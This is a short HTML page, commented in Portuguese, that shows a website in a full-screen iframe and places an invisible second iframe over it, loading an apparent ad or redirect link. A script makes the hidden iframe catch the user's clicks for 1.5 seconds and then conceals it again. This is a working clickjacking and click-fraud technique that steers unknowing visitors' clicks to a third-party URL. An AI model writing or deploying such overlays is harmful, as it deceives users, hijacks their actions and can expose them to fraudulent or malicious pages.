<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<title>Iframe visível + iframe clicável</title>
<style>
  html, body {
    margin: 0; padding: 0; height: 100%;
    overflow: hidden;
  }
  .container {
    position: relative;
    width: 100%;
    height: 100vh;
  }
  iframe.visible {
    position: absolute;
    width: 100%;
    height: 100%;
    border: none;
    z-index: 1;
  }
  iframe.clickable {
    position: absolute;
    width: 100%;
    height: 100%;
    border: none;
    opacity: 0;
    z-index: 2;
    pointer-events: none; /* inicialmente não recebe clique */
    transition: opacity 0.3s ease;
  }
</style>
</head>
<body>

<div class="container" id="iframeContainer">
  <!-- iframe visível que o usuário vê -->
  <iframe class="visible" src="https://www.aguiaoficial.site" id="visibleIframe"></iframe>

  <!-- iframe invisível para cliques -->
  <iframe class="clickable" src="https://otieu.com/4/8938519" id="clickableIframe"></iframe>
</div>

<script>
  const container = document.getElementById('iframeContainer');
  const clickableIframe = document.getElementById('clickableIframe');

  container.addEventListener('click', () => {
    // Quando usuário clicar na área, torna iframe clicável visível para o clique ser registrado
    clickableIframe.style.pointerEvents = 'auto'; // permite clique
    clickableIframe.style.opacity = '1';

    // Após 1.5 segundos, volta a ficar invisível e não clicável
    setTimeout(() => {
      clickableIframe.style.opacity = '0';
      clickableIframe.style.pointerEvents = 'none';
    }, 1500);
  });
</script>

</body>
</html>
